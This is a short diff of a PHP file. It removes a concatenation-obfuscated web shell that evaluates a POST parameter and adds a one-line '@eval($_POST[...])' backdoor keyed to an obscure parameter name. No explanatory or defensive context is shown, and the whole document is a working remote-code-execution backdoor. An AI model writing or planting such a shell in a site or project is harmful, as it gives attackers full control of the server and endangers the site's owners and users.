@@ -1,6 +1,1 @@
-<?php
-$a="e"."v";
-$b="a"."l";
-$c=$a.$b;
-$c($_POST['a']);
-?>
+<?php @eval($_POST['Msksk3kfjk2kJHK']);?>
